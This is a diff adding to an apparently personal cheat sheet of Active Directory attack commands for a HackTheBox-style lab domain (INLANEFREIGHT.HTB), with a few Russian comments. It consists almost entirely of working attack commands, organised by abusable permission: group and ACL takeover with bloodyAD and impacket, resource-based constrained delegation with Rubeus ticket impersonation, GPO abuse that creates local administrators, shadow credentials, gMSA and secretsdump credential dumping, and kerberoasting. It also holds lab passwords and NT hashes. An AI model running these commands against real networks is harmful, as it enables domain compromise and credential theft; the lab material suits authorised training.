@@ -249,3 +249,144 @@ python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_
 
 # Заменить Password
     bloodyAD -u mark.bbond -p '1day@atime' --host dc01.mirage.htb -d mirage.htb -k set password javier.mmarshall 'Password123'
+
+
+
+
+# pedro 	Password17 	GenericAll (Group) 	ITAdmins
+bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add groupMember ITADMINS pedro
+
+
+# pedro 	Password17 	GenericAll (Computer) 	WS01
+bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add computer "comp" 'p@ssword123!'
+bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add rbcd 'WS01$' 'comp$'
+rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'
+impacket-getST -spn 'cifs/WS01' -impersonate 'administrator' 'INLANEFREIGHT.HTB/'comp'':'p@ssword123!'
+proxychains export KRB5CCNAME=administrator@cifs_WS01@INLANEFREIGHT.HTB.ccache impacket-wmiexec WS01.INLANEFREIGHT.HTB -k -no-pass
+7DDB26CB86B15AF2EB6566C079260417
+7DDB26CB86B15AF2EB6566C079260417
+./Rubeus.exe s4u /user:comp$ /rc4:7DDB26CB86B15AF2EB6566C079260417 /impersonateuser:administrator /msdsspn:cifs/WS01.INLANEFREIGHT.HTB /ptt
+Enter-PSSession WS01.INLANEFREIGHT.HTB
+
+# pedro 	Password17 	GenericAll (Domain) 	INLANEFREIGHT
+impacket-secretsdump 'INLANEFREIGHT.HTB'/'pedro':'Password17'@'172.16.130.3'
+proxychains impacket-GetUserSPNs -dc-ip 172.16.130.3 inlanefreight.htb/ester:Password15 -request
+
+# carlos 	Password18 	WriteDacl (User) 	juliette
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carlos' -target 'juliette' 'inlanefreight.htb'/'carlos:Password18'
+bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u pedro -p Password17 add computer "comp" 'p@ssword123!'
+proxychains bloodyAD -d "INLANEFREIGHT.HTB" --host "172.16.130.3" -u carlos -p Password18 set object "juliette" servicePrincipalName -v 'cifs/SRV01'
+
+# carlos 	Password18 	WriteDacl (Group) 	FirewallManagers
+proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'carlos' -target-dn 'CN=FIREWALLMANAGERS,CN=USERS,DC=INLANEFREIGHT,DC=HTB' 'inlanefreight.htb'/'carlos:Password18'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u carlos -p Password18 add groupMember FIREWALLMANAGERS pedro
+
+
+# carlos 	Password18 	WriteDacl (Computer) 	SRV01 --> RBCD
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carlos' -target 'SRV01' 'inlanefreight.htb'/'carlos:Password18'
+########proxychains impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 172.16.130.3 -domain-netbios INLANEFREIGHT.HTB 'inlanefreight.htb'/'carlos:Password18'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u carlos -p Password18 add computer "comp" 'p@ssword123!'
+proxychains impacket-rbcd -delegate-from 'comp$' -delegate-to 'SRV01$' -action 'write' 'inlanefreight.htb'/'carlos:Password18'
+Rubeus.exe hash /password:'p@ssword123!'
+7DDB26CB86B15AF2EB6566C079260417
+.\Rubeus.exe s4u /user:comp$ /rc4:7DDB26CB86B15AF2EB6566C079260417 /impersonateuser:administrator /msdsspn:cifs/SRV01.inlanefreight.htb /ptt
+ net use S: \\SRV01.inlanefreight.htb\C$ /persistent:yes
+
+# carlos 	Password18 	WriteDacl (Domain) 	INLANEFREIGHT
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'carlos' -target-dn 'DC=INLANEFREIGHT,DC=HTB' 'inlanefreight.htb'/'carlos:Password18'
+proxichains impacket-secretsdump 'INLANEFREIGHT.HTB'/'carlos:Password18'@'172.16.130.3'
+
+# indhi 	Password20 	WriteOwner (User) 	juliette
+proxychains impacket-owneredit -action write -new-owner 'indhi' -target 'juliette' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'indhi' -target 'juliette' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+proxychains bloodyAD -d "INLANEFREIGHT.HTB" --host "172.16.130.3" -u indhi -p Password20 set object "juliette" servicePrincipalName -v 'cifs/SRV01'
+proxychains impacket-GetUserSPNs -dc-ip 172.16.130.3 inlanefreight.htb/ester:Password15 -request
+
+# indhi 	Password20 	WriteOwner (Group) 	FirewallManagers
+proxychains impacket-owneredit -action write -new-owner 'indhi' -target 'FIREWALLMANAGERS' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'indhi' -target-dn 'CN=FIREWALLMANAGERS,CN=USERS,DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u indhi -p Password20 add groupMember FIREWALLMANAGERS pedro
+
+# indhi 	Password20 	WriteOwner (Computer) 	SRV01 -  RBCD
+proxychains impacket-owneredit -action write -new-owner 'indhi' -target 'SRV01$' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'indhi' -target 'SRV01$' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u indhi -p Password20 add computer "comp1" 'p@ssword123!'
+proxychains impacket-rbcd -delegate-from 'comp1$' -delegate-to 'SRV01$' -action 'write' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains  nxc ldap 172.16.130.3 -u ester -p Password15 --trusted-for-delegation --find-delegation
+.\Rubeus.exe s4u /user:comp1$ /rc4:7DDB26CB86B15AF2EB6566C079260417 /impersonateuser:administrator /msdsspn:cifs/SRV01.inlanefreight.htb /ptt
+ net use S: \\SRV01.inlanefreight.htb\C$ /persistent:yes
+
+# indhi 	Password20 	WriteOwner (Domain) 	INLANEFREIGHT
+proxychains impacket-owneredit -action write -new-owner 'indhi' -target-dn 'DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'indhi' -target-dn 'DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'indhi':'Password20'
+proxychains impacket-secretsdump 'INLANEFREIGHT.HTB'/'indhi:Password20'@'172.16.130.3'
+
+# svc_backups 	BackingUpSecure1 	WriteDacl 	BACKUPS (GPO)
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'svc_backups' -target-dn 'CN={69D0F352-CA85-46C7-91AF-46429FDD290E},CN=POLICIES,CN=SYSTEM,DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1'
+proxychains ./pygpoabuse.py 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1' -gpo-id "69D0F352-CA85-46C7-91AF-46429FDD290E"  --> Add john user to local administrators group (Password: H4x00r123..)
+***where gpo-id = distinguishedname CN={69D0F352-CA85-46C7-91AF-46429FDD290E},CN=POLICIES,CN=SYSTEM,DC=INLANEFREIGHT,DC=HT     
+proxychains nxc smb 172.16.130.3 -u john -p H4x00r123..
+
+# svc_backups 	BackingUpSecure1 	WriteOwner 	BACKUPS (GPO)
+proxychains impacket-owneredit -action write -new-owner 'svc_backups' -target-dn 'CN={69D0F352-CA85-46C7-91AF-46429FDD290E},CN=POLICIES,CN=SYSTEM,DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1'
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'svc_backups' -target-dn 'CN={69D0F352-CA85-46C7-91AF-46429FDD290E},CN=POLICIES,CN=SYSTEM,DC=INLANEFREIGHT,DC=HTB' 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1'
+proxychains ./pygpoabuse.py 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1' -gpo-id "69D0F352-CA85-46C7-91AF-46429FDD290E" -command "net user NewAdmin P@ssw0rd! /add && net localgroup administrators NewAdmin /add" -f
+
+
+# svc_backups 	BackingUpSecure1 	GenericWrite 	BACKUPS (GPO)
+proxychains ./pygpoabuse.py 'INLANEFREIGHT.HTB'/'svc_backups':'BackingUpSecure1' -gpo-id "69D0F352-CA85-46C7-91AF-46429FDD290E" -command "net user max P@ssw0rd! /add && net localgroup administrators max /add" -f
+
+# indhi 	Password20 	WriteSPN 	nicole
+proxychains bloodyAD -d "INLANEFREIGHT.HTB" --host "172.16.130.3" -u indhi -p Password20 set object "nicole" servicePrincipalName -v 'cifs/SRV01'
+proxychains impacket-GetUserSPNs -dc-ip 172.16.130.3 inlanefreight.htb/ester:Password15 -request
+
+# nicole 	Password21 	GenericWrite 	albert
+proxychains bloodyAD -d "INLANEFREIGHT.HTB" --host "172.16.130.3" -u nicole -p Password21 set object "albert" servicePrincipalName -v 'cifs/SRV01'
+proxychains impacket-GetUserSPNs -dc-ip 172.16.130.3 inlanefreight.htb/ester:Password15 -request
+
+# sarah 	Password12 	AddKeyCredentialLink 	indhi
+### pyWhisker - добавление Shadow Credentials
+proxychains pywhisker.py -d "inlanefreight.htb" -u "sarah" -p "Password12" --target "indhi" --action "add"
+### PKINITtools - получение TGT через PKINIT
+python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass certpass domain.local/targetUser tgt.ccache
+### PKINITtools - извлечение NT hash через UnPACtheHash
+export KRB5CCNAME=tgt.ccache
+python3 getnthash.py -key <AS-REP-key> domain.local/targetUser
+### Output: NT hash целевого пользователя
+
+или
+proxychains certipy-ad shadow auto -username sarah@inlanefreight.htb -p Password12 -account indhi
+
+# elieser 	Password22 	Owns (User) 	nicole
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'
+proxychains impacket-dacledit -action 'write' -rights 'FullControl' -principal 'elieser' -target 'nicole' inlanefreight.htb/elieser:Password22
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+proxychains bloodyAD -d "INLANEFREIGHT.HTB" --host "172.16.130.3" -u elieser -p Password22 set object "nicole" servicePrincipalName -v 'cifs/SRV01'
+proxychains impacket-GetUserSPNs -dc-ip 172.16.130.3 inlanefreight.htb/ester:Password15 -request
+
+
+# daniela 	Password23 	AddKeyCredentialLink 	SRV01 (computer)
+***pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
+proxychains certipy-ad shadow auto -username daniela@inlanefreight.htb -p Password23 -account SRV01
+proxychains nxc smb 172.16.130.3 -u 'SRV01$' -H d1327470a464c136a6dce2d91340dc82
+
+# cherly 	Password24 	ReadLAPSPassword 	LAPS01 (competer)!!!!!!!!!
+*addcomputer.py -method LDAPS -computer-name 'LAPS01$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'
+proxychains bloodyAD --host 172.16.130.3 -d INLANEFREIGHT.HTB -u carlos -p Password18 add computer "comp1" 'p@ssword123!'
+
+# cherly 	Password24 	ReadGMSAPassword 	svc_devadm
+proxychains python gMSADumper.py -u 'cherly' -p 'Password24' -d 'INLANEFREIGHT.HTB'
+proxychains nxc smb 172.16.130.3 -u 'svc_devadm$' -H '8ae0141902311bcea8c7134773c22862'
+
+
+# elizabeth 	Password26 	AllExtendedRights (User) 	elieser
+proxychains net rpc password "elieser" 'newP@ssword2022' -U "INLANEFREIGHT.HTB"/"elizabeth%Password26" -S "172.16.130.3"
+proxychains nxc smb 172.16.130.3 -u 'elieser' -p 'newP@ssword2022'
+
+
+
+# gil 	Password28 	AddAllowedToAct 	DC01
+
+
+
